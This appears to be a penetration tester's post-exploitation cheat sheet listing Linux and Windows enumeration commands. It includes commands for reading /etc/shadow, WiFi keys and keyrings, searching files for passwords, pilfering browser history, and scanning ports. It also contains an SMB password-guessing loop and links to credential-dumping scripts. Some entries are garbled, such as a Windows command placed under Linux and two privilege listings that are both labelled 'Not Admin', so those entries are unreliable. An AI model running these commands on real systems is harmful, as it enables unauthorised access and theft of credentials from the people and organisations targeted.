---
title: Landing Commands
category: Post-Exploitation
order: 2
---

> **Linux**

Kernal version  | <code> uname -r </code>
Distro Version | <code>cat /etc/issue </code>
Determine Account | <code> whoami </code>
Add User | <code> useradd -d [home_dir] [login name] </code>
Privilidges |<code>  id </code>
Network Activity | <code> netstat -natu </code>
ARP Cache | <code> arp -a </code>
Routing Table | <code> netstat -nr </code>
Lockout Policy | <code> grep tally /etc/pam.d/* <br> grep tally /etc/pam.conf" </code>
Find Public IP Address | <code> curl icanhazip.com <br> nslookup myip.opendns.com resolver1.opendns.com </code>
Passwords and Users | <code> cat etc/passwd && cat etc/shadow </code>
Wifi Password | <code> /etc/NetworkManager/system-connections </code>
Gnome Keyring | <code> ~/.gnome/keyrings </code>
Find Interesting Files | <code> wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE </code>
Find Interesting File Names and Perms | <code> find / -iname "shadow*" -perm /o+r -ls 2>/dev/null </code>
Find Interesting Content Files 1 | <code> grep -irIL pass /opt/ 2>/dev/null </code>
Find Interesting Content Files 2 | <code> find /home -iname "*.txt" 2>/dev/null -exec grep -c 2 -li  'pass' {} \; </code>
Find Interesting Content Regex | <code> find /home -iname "*.txt" 2>/dev/null -exec egrep -li "^.+@.+$" {} \; </code>

> **Local Windows Accounts and Processes**

Determine Account | <code> whoami, set username </code>
Determin OS Information | <code> wmic os get Caption <code>
Determine OS Information 2 | <code> wmic computersystem LIST full </code>
Anti-Virus info | <code> wmic /namespace:\\root\securitycenter2 path antivirusproduct </code>
Patches Installed | <code> wmic qfe list brief </code>
Processes | <code> tasklist /V /FO CSV </code>
Services | <code> sc query </code>
List Users | <code> net user <br> wmic useraccount list brief </code>
List Groups | <code> net localgroup [/domain] </code> 
List Administrators | <code> net localgroup administrators [/domain] </code> 
List Password and Lockout Policy | <code> net accounts or net accounts /domain </code> 
Find Public IP Address | <code> curl icanhazip.com <br> nslookup myip.opendns.com resolver1.opendns.com </code>
List Groups for Account | <code> DSQUERY USER -samid loginname | DSGET USER -memberof -expand </code>
Inventory Software | <code> dir /s  c:\Program Files > inventory.txt <br> dir /s ""c:\Program Files (x86)"" >> inventory.txt <br> set path </code>
Find Interesting Files | <code> ls -r -file -filter pass* </code>
Find Interesting Info in Files | <code> ls -r c:\ -file | % {select-string -path $_ -pattern mypassword} </code>

If using meterpreter run getprivs, you are an admin if it looks like this:

==============<br>
Not Admin<br>
==============<br>
  SeShutdownPrivilege<br>
  SeChangeNotifyPrivilege<br>
  SeUndockPrivilege<br>

==============<br>
Not Admin<br>
==============<br>
  SeDebugPrivilege<br>
  SeIncreaseQuotaPrivilege<br>
  SeSecurityPrivilege<br>
  SeTakeOwnershipPrivilege<br>
  SeLoadDriverPrivilege<br>
  SeSystemProfilePrivilege<br>
  SeSystemtimePrivilege<br>
  SeProfileSingleProcessPrivilege<br>
  SeIncreaseBasePriorityPrivilege<br>
  SeCreatePagefilePrivilege<br>
  SeBackupPrivilege<br>
  SeRestorePrivilege<br>
  SeShutdownPrivilege<br>
  SeSystemEnvironmentPrivilege<br>
  SeChangeNotifyPrivilege<br>
  SeRemoteShutdownPrivilege<br>
  SeUndockPrivilege<br>
  SeManageVolumePrivilege<br>

> **Windows Domain  Enumeration**

List Domain Info | <code> wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE </code>
MSF Domain Info | <code> run post/windows/gather/enum_domain </code>
List Domain User Info | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='testAccount'" GET  </code>
List All Users | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname </code>
List All Groups | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname </code>
List Members of Group (e.g., domain admin) | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value </code>
List all computers on domain | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname </code>
List all computers on domain | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname </code>
List Domain Controllers | <code> NETDOM QUERY /D:MyDomain DC </code>
List Domain Controllers | <code> DSQUERY Server </code>
List Member Servers | <code> NETDOM QUERY /D:MyDomain SERVER </code>
List all Workstations | <code> NETDOM QUERY /D:MyDomain WORKSTATION </code>
List all shares for a system | <code> net view [system] /ALL [/Domain] </code>

> **Windows Network Enumeration**

DNS Cache | <code> ipconfig /displaydns </code>
Arp Cache | <code> arp -a </code>
Network Activity | <code> netstat -na | find "ESTABLISHED" </code>
Routing Table | <code> netstat -nr  </code>
Ping Sweep | <code> for /L %i in (1, 1, 255) do @ping -n 1 192.168.2.%i | find "TTL" </code> 
DNS Lookup | <code> for /L %i in (1, 1, 255) do @echo 10.10.10.%i & nslookup 10.10.10.%i  2>nul | find "Name" </code> 
PowerShell port scanner | <code> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null </code>
Scan a range of IPs for a single port | <code> foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip} </code>
PS IP range & port range scanner | <code> 1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null} </code>
PS test egress filtering | <code> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port $_ is open!" } 2>$null </code>
Password Guess | <code> for /f %i in (password.lst) do @echo %i & @net use \\[tartet_IP_addr] %i /u:[UserName] 2>nul && echo [UserName]: %i >> success.txt </code> 

> **Browsers**

Finding user browser history and passwords in Firefox history:
{% highlight bash %}
sqlite3 ~/pilfered-firefox-profile/gn2uzbr6.Default\ User/places.sqlite sqlite> select * from moz_places where url like "%@%";

Cd ~/.mozilla/firefox/g4iiysbk.default/Cache
Strings [filename] | grep [file eg php]
{% endhighlight %}

Chrome: 
* [Browser Gather](https://github.com/sekirkity/BrowserGather)
* [ChromeDump](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-ChromeDump.ps1)
* [ChromeDump](https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-ChromeDump.ps1)

> **Survey**

* [Clicky](https://gist.github.com/leechristensen/10999daab91b3b34108a9e7201838452)
* [WLAN keys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)
* [SessionGopher](https://github.com/fireeye/SessionGopher)


> **Interesting Files**

Passwords.txt	| Users often create password files as reminders.
wp-config.php | 	WordPress configuration file. Stores database passwords.
key3.db / logins.json	| Password file for the Firefox web browser.
<custom>.sh	| Administrators often store plaintext passwords in automation scripts
fstab	| The fstab may contain passwords to mounted samba shares
*.pst	| Users may email passwords around. These can often be found in .pst files
  
> **Regex Library**

[regexlib](http://www.regexlib.com/)

